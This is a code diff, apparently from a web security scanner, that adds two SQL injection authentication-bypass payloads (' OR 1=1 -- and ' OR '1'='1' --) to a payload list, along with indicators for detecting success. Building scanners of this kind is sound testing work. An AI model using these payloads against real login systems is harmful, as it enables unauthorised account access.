@@ -91,6 +91,43 @@ const errorBasedPayloads: Payload[] = [
     applicableContexts: ["url_param", "body_param"],
     encoding: "none",
   },
+  {
+    id: generatePayloadId("sqli", "error_based", 6),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "' OR 1=1 --",
+    description: "Auth bypass with comment terminator — comments out password check and remaining WHERE clauses",
+    expectedBehavior: "Authentication bypass returning first user (typically admin), status change 401→200",
+    successIndicators: [
+      "token",
+      "jwt",
+      "session",
+      "authenticated",
+      "success",
+      "admin",
+    ],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
+  {
+    id: generatePayloadId("sqli", "error_based", 7),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "' OR '1'='1' --",
+    description: "Auth bypass variant with string comparison and comment terminator",
+    expectedBehavior: "Authentication bypass, status change",
+    successIndicators: [
+      "token",
+      "session",
+      "success",
+    ],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
 ];
 
 const timeBasedPayloads: Payload[] = [
